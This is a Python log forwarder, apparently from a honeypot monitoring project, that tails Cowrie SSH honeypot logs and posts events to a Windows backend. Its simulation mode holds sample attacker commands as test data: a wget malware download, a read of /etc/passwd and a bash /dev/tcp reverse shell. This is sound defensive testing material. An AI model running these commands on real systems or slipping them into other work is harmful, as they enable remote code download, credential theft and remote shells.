#!/usr/bin/env python3
"""
=============================================================================
  HONEYPOT AI - PYTHON LOG FORWARDER (KALI LINUX -> WINDOWS BACKEND)
=============================================================================
This script runs on the Kali Linux Honeypot machine.
It tails 'cowrie.json' in real-time and forwards each attack event via
HTTP POST to the Windows machine (Attack Service or API Gateway).

Usage on Kali Linux:
    python3 send_logs.py --target http://<WINDOWS_IP>:8081/api/attacks/ingest
    
Example:
    python3 send_logs.py --target http://192.168.1.10:8081/api/attacks/ingest --log /home/cowrie/cowrie/var/log/cowrie/cowrie.json

Simulation mode (for testing without live Cowrie):
    python3 send_logs.py --target http://localhost:8081/api/attacks/ingest --simulate
=============================================================================
"""

import os
import sys
import time
import json
import argparse
import requests
from datetime import datetime

DEFAULT_COWRIE_LOG = "/home/cowrie/cowrie/var/log/cowrie/cowrie.json"
DEFAULT_TARGET_URL = "http://localhost:8081/api/attacks/ingest"

def parse_args():
    parser = argparse.ArgumentParser(description="Forward Cowrie honeypot events from Kali Linux to Windows Backend")
    parser.add_argument("-t", "--target", default=DEFAULT_TARGET_URL, help=f"Windows target URL (default: {DEFAULT_TARGET_URL})")
    parser.add_argument("-l", "--log", default=DEFAULT_COWRIE_LOG, help=f"Path to cowrie.json (default: {DEFAULT_COWRIE_LOG})")
    parser.add_argument("-s", "--simulate", action="store_true", help="Run in simulation mode generating sample Cowrie attacks")
    parser.add_argument("-b", "--batch-delay", type=float, default=0.1, help="Delay between forwarded events (seconds)")
    return parser.parse_args()

def send_event_to_windows(target_url, event_data):
    """Sends a single parsed Cowrie event to the Windows Attack Service / API Gateway"""
    try:
        response = requests.post(
            target_url,
            json=event_data,
            headers={"Content-Type": "application/json"},
            timeout=2
        )
        if response.status_code in [200, 201]:
            event_id = event_data.get("eventid", "unknown")
            ip = event_data.get("src_ip", "-")
            detail = event_data.get("input") or event_data.get("username") or event_data.get("message") or ""
            print(f"[{datetime.now().strftime('%H:%M:%S')}] [FORWARDED] {event_id:<25} IP: {ip:<15} Detail: {detail}")
            return True
        else:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] [!] HTTP {response.status_code}: {response.text[:100]}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] [OFFLINE] Could not reach Windows at {target_url}")
        return False

def tail_file(filepath):
    """Generator that yields new lines added to a file (like 'tail -f')"""
    if not os.path.exists(filepath):
        print(f"[!] Warning: Log file '{filepath}' does not exist yet. Waiting for Cowrie to start...")
        while not os.path.exists(filepath):
            time.sleep(2)
        print(f"[+] Log file detected: {filepath}")

    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        f.seek(0, os.SEEK_END)
        while True:
            line = f.readline()
            if not line:
                time.sleep(0.2)
                continue
            yield line

def run_forwarder(target_url, log_file):
    print("=" * 70)
    print("  [KALI LINUX] HONEYPOT AI - PYTHON LOG FORWARDER (KALI -> WINDOWS)")
    print("=" * 70)
    print(f"  * Reading Cowrie log from : {log_file}")
    print(f"  * Forwarding events to    : {target_url}")
    print("  * Status                  : RUNNING (Press Ctrl+C to stop)")
    print("=" * 70)

    count = 0
    for line in tail_file(log_file):
        line = line.strip()
        if not line:
            continue
        try:
            event = json.loads(line)
            success = send_event_to_windows(target_url, event)
            if success:
                count += 1
        except json.JSONDecodeError:
            print(f"[!] Skipping invalid JSON line: {line[:50]}...")
        except Exception as e:
            print(f"[!] Error processing event: {e}")

def run_simulation(target_url, delay):
    print("=" * 70)
    print("  [SIMULATION] HONEYPOT AI - FORWARDER TEST (Kali -> Windows)")
    print("=" * 70)
    print(f"  * Target Windows Endpoint : {target_url}")
    print("=" * 70)

    simulated_events = [
        {
            "eventid": "cowrie.session.connect",
            "session": "sess_kali_901",
            "src_ip": "185.220.101.5",
            "src_port": 49152,
            "dst_ip": "192.168.1.20",
            "dst_port": 2222,
            "protocol": "SSH",
            "country": "DE",
            "city": "Frankfurt",
            "timestamp": datetime.now().isoformat()
        },
        {
            "eventid": "cowrie.login.failed",
            "session": "sess_kali_901",
            "username": "root",
            "password": "password123",
            "src_ip": "185.220.101.5",
            "timestamp": datetime.now().isoformat()
        },
        {
            "eventid": "cowrie.login.success",
            "session": "sess_kali_901",
            "username": "root",
            "password": "admin",
            "src_ip": "185.220.101.5",
            "timestamp": datetime.now().isoformat()
        },
        {
            "eventid": "cowrie.command.input",
            "session": "sess_kali_901",
            "input": "uname -a",
            "src_ip": "185.220.101.5",
            "timestamp": datetime.now().isoformat()
        },
        {
            "eventid": "cowrie.command.input",
            "session": "sess_kali_901",
            "input": "wget http://185.220.101.5/malware.sh -O /tmp/malware.sh",
            "src_ip": "185.220.101.5",
            "timestamp": datetime.now().isoformat()
        },
        {
            "eventid": "cowrie.command.input",
            "session": "sess_kali_901",
            "input": "chmod +x /tmp/malware.sh",
            "src_ip": "185.220.101.5",
            "timestamp": datetime.now().isoformat()
        },
        {
            "eventid": "cowrie.session.file_download",
            "session": "sess_kali_901",
            "url": "http://185.220.101.5/malware.sh",
            "outfile": "malware.sh",
            "shasum": "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8",
            "timestamp": datetime.now().isoformat()
        },
        {
            "eventid": "cowrie.session.closed",
            "session": "sess_kali_901",
            "duration": 45.2,
            "timestamp": datetime.now().isoformat()
        },
        {
            "eventid": "cowrie.session.connect",
            "session": "sess_kali_902",
            "src_ip": "194.26.29.112",
            "src_port": 52140,
            "dst_ip": "192.168.1.20",
            "dst_port": 2222,
            "protocol": "SSH",
            "country": "RU",
            "city": "Moscow",
            "timestamp": datetime.now().isoformat()
        },
        {
            "eventid": "cowrie.login.success",
            "session": "sess_kali_902",
            "username": "admin",
            "password": "admin",
            "src_ip": "194.26.29.112",
            "timestamp": datetime.now().isoformat()
        },
        {
            "eventid": "cowrie.command.input",
            "session": "sess_kali_902",
            "input": "cat /etc/passwd",
            "src_ip": "194.26.29.112",
            "timestamp": datetime.now().isoformat()
        },
        {
            "eventid": "cowrie.command.input",
            "session": "sess_kali_902",
            "input": "bash -i >& /dev/tcp/194.26.29.112/4444 0>&1",
            "src_ip": "194.26.29.112",
            "timestamp": datetime.now().isoformat()
        },
        {
            "eventid": "cowrie.session.closed",
            "session": "sess_kali_902",
            "duration": 82.5,
            "timestamp": datetime.now().isoformat()
        }
    ]

    for ev in simulated_events:
        send_event_to_windows(target_url, ev)
        time.sleep(delay)

    print("\n[+] Simulation finished. (Start Windows services in Eclipse to receive events)")

def main():
    args = parse_args()
    if args.simulate:
        run_simulation(args.target, args.batch_delay)
    else:
        run_forwarder(args.target, args.log)

if __name__ == "__main__":
    main()
